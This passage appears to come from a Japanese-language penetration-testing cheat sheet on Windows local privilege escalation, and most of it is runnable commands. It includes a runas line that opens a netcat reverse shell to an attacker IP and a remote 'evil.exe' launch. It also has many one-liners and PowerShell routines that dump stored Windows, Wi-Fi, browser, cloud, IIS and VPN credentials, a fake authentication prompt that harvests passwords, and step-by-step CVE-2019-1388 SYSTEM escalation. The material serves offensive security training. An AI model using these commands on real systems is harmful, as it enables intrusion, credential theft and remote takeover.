net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェース & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧、ルールの作成、無効化、無効化...)**

さらに[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも存在します。

root user を取得すると、任意のポートで待ち受けできます（最初に `nc.exe` をポートで待ち受けに使うと、GUI で `nc` を firewall によって許可するか尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単にrootとしてbashを起動するには、`--default-user root`を試してください

フォルダ`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`で`WSL`ファイルシステムを参照できます。

## Windows 資格情報

### Winlogon 資格情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 資格情報マネージャー / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault は、**Windows** が **ユーザーを自動的にログインさせる** サーバー、Web サイト、その他のプログラム用のユーザー資格情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存してブラウザで自動的にログインするように見えるかもしれませんが、そうではありません。

Windows Vault は、Windows が自動的にログインできる資格情報を保存します。つまり、リソース（サーバーや Web サイト）にアクセスするために資格情報を必要とする**Windows アプリケーション**は**この Credential Manager と Windows Vault を利用できる**ため、ユーザーが毎回ユーザー名とパスワードを入力する代わりに保存された資格情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの資格情報を利用することはできないと思われます。したがって、あなたのアプリケーションが vault を利用したいのであれば、デフォルトのストレージ vault からそのリソースの資格情報を取得するために、何らかの方法で**credential manager と通信して資格情報を要求する**必要があります。

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、`/savecred` オプションを使って保存された資格情報を利用するために `runas` を使用できます。以下の例は SMB 共有経由でリモートのバイナリを呼び出すものです。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` を提供された資格情報で使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)でも利用できる点に注意してください。

### DPAPI

The **Data Protection API (DPAPI)** は、データを対称暗号化するための手法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化は、エントロピーに大きく寄与するユーザまたはシステムのシークレットを利用します。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。システム暗号化のケースでは、システムのドメイン認証シークレットを利用します。

DPAPI を使用した暗号化済みのユーザ RSA キーは、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file** は、通常 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用して復号できます。

通常、**マスターパスワードで保護された認証情報ファイル** は以下にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を使って復号するには、**mimikatz module** `dpapi::cred` を使用できます.\\
`sekurlsa::dpapi` モジュールを使用すると（root の場合）、**多数の DPAPI を抽出** **masterkeys** を **memory** から取得できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された認証情報を便利に保存するために、**スクリプト**や自動化タスクでよく使用されます。これらの認証情報は **DPAPI** で保護されており、通常は作成時と同じユーザーが同じコンピュータ上でのみ復号できます。

ファイルに含まれる PS 認証情報を **復号する** には、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 無線LAN (Wi-Fi)
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

これらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモートデスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Mimikatz の `sekurlsa::dpapi` モジュールを使うと、メモリから多くの **DPAPI masterkeys** を抽出できます

### Sticky Notes

Windows のワークステーションでは、ユーザが StickyNotes app を使って、これがデータベースファイルであることに気づかずに **save passwords** やその他の情報を保存していることがよくあります。  
このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、いくつかの **credentials** が設定されており、**recovered** できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください .\
インストーラーは **run with SYSTEM privileges**, 多くは **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** に対して脆弱です。
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルと Registry (Credentials)

### PuttyのCreds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、そこに興味深いものがないか確認してください：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` サービスが実行されておらず、起動時に自動で開始させたい場合は、次を実行してください:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。ssh keysを作成し、`ssh-add`で追加してsshでマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon は非対称鍵認証の際に `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは**metasploit**を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Search for a file called **SiteList.xml**

### キャッシュされた GPP パスワード

以前、Group Policy Preferences (GPP) を介して複数のマシンにカスタムのローカル管理者アカウントを配布できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして格納されている Group Policy Objects (GPOs) は、任意のドメインユーザーがアクセスできました。次に、これらの GPP 内のパスワードは、公開されている既定のキーを用いて AES256 で暗号化されており、認証済みユーザーであれば復号できました。これはユーザーが権限昇格を行える可能性があり、深刻なリスクをもたらしました。

このリスクを軽減するために、"cpassword" フィールドが空でないローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。該当するファイルを見つけると、その関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ脆弱性の特定と修復を支援します。

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使ってパスワードを取得する：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IISのWeb Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

ユーザーが知っている可能性があると思うなら、常に **ユーザーに自身の credentials、あるいは別のユーザーの credentials を入力するよう頼むことができます**（ただし、クライアントに直接 **尋ねる** ことで **credentials** を要求するのは非常に **危険** であることに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前、**passwords** を **clear-text** または **Base64** で含んでいた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されたすべてのファイルを検索してください:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin内の資格情報

Binもチェックして、そこに資格情報がないか確認してください

To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他の可能性のあるレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

パスワードが保存されている**Chrome or Firefox**のdbを確認してください。\
また、ブラウザの履歴、ブックマーク、ファビリット（お気に入り）も確認し、そこに**passwords are**保存されている可能性もあります。

ブラウザからパスワードを抽出するためのツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) は、Windows オペレーティングシステムに組み込まれた技術で、異なる言語で書かれたソフトウェアコンポーネント間の相互通信を可能にします。各 COM コンポーネントは class ID (CLSID) で識別され、各コンポーネントは一つ以上のインターフェースを介して機能を公開し、そのインターフェースは interface IDs (IIDs) で識別されます。

COM クラスおよびインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** の下で定義されています。これらのレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** と **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果が **HKEY\CLASSES\ROOT** となります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される DLL のいずれかを上書きできれば、その DLL が別のユーザーによって実行される場合に、escalate privileges することが可能です。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**ファイル内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### passwords を検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf の** plugin 私はこのプラグインを作成し、被害者内で**credentialsを検索するすべてのmetasploit POSTモジュールを自動的に実行する**ようにしました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) はこのページで言及されているpasswordsを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからpasswordを抽出するもう一つの優れたツールです。 

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータをclear textで保存するいくつかのツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の**sessions**、**usernames**、および**passwords**を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

プロセス間通信とデータ転送を可能にする共有メモリセグメントは、**pipes**と呼ばれます。

Windowsは**Named Pipes**という機能を提供しており、異なるプロセスやネットワーク間でもデータ共有ができます。これはクライアント/サーバーの構成に似ており、役割は**named pipe server**と**named pipe client**として定義されます。

クライアントが**pipe**を通じてデータを送信すると、そのpipeを設定した**server**は必要な**SeImpersonate**権限を持っていれば**clientのアイデンティティを引き受ける**ことができます。あなたが模倣できるpipe経由で通信する**特権プロセス**を特定できれば、そのプロセスがあなたの作成したpipeとやり取りした際にそのアイデンティティを引き受けることで、**より高い権限を得る**チャンスが生まれます。この攻撃を実行する手順については、[**here**](named-pipe-client-impersonation.md)および[**here**](#from-high-integrity-to-system)のガイドが参考になります。

また、次のツールはburpのようなツールで**named pipeの通信をインターセプト**することを可能にします: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **そして別のツールはすべてのpipeを一覧表示してprivescsを見つけるのに使えます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

ページを参照してください: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

ユーザーとしてシェルを得た場合、スケジュールされたタスクや他のプロセスが**コマンドラインで認証情報を渡す**ことがあります。以下のスクリプトは、プロセスのコマンドラインを2秒ごとにキャプチャし、現在の状態を前回の状態と比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからのパスワード窃取

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、いくつかの Microsoft Windows のバージョンでは、低権限ユーザーから "NT\AUTHORITY SYSTEM" のような terminal やその他のプロセスを実行することが可能です。

これにより、同じ脆弱性を利用して権限昇格と UAC のバイパスを同時に行うことが可能になります。さらに、何もインストールする必要はなく、プロセスで使用される binary は署名されており Microsoft によって発行されています。

影響を受けるシステムの一部は以下の通りです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
必要なファイルと情報は以下のGitHubリポジトリにすべてあります:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Integrity Levels について学ぶには、これを読んでください: 


{{#ref}}
integrity-levels.md
{{#endref}}

次に UAC と UAC bypasses について学ぶには、これを読んでください: 


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

この手法は [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、エクスプロイトコードは [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) にあります。

